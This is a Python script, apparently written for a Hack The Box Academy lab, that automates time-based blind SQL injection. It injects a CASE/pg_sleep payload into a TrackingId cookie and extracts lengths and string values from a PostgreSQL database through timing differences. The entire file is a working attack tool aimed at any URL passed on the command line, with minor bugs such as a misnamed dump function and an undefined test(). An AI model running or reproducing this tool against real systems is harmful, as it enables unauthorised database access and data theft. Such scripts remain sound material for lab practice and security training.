import sys,requests,string,time

def url():
    return sys.argv[1]

def cookie():
    session=requests.Session()
    session.get(url())
    return session.cookies.get_dict()["TrackingId"]

delay=5
def oracle(q):
    start = time.time()    
    r = requests.get(url(),cookies={"TrackingId": f"' || CASE WHEN ({q}) THEN (SELECT 1 FROM pg_sleep({delay})) ELSE NULL END--"})
    #print(time.time() - start)
    return time.time() - start > delay

# confirm oracle can run
"""
assert oracle("1=1")
assert oracle("1=0")
"""

#Calculate the Length
def dumpNumber(q):
    low = 0
    high = 127
    while low <= high:
        mid = (low+high) // 2
        if oracle(f"({q}) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    return low

# Dumping String
def dump_string(q, length):
    var = ""
    for i in range(1,length+1):  
        c = 0
        for p in range(7):
            if oracle(f"ASCII(SUBSTRING(({q}),{i},1))&{2**p}>0"):
                c |= 2**p
        var += chr(c)
        print(var)
    return var

func = int(input("""HTB_ACADEMY_ORACLE
(1) Get Length
(2) Get Name
Your Option : """))

if func == 0:
    test()
elif func == 1:
    payload = input("Payload : ")
    print(dumpNumber(payload))
elif func == 2:
    payload = input("Payload : ")
    string, length = payload.rsplit(maxsplit=1)
    print(dumpString(string,int(length)))
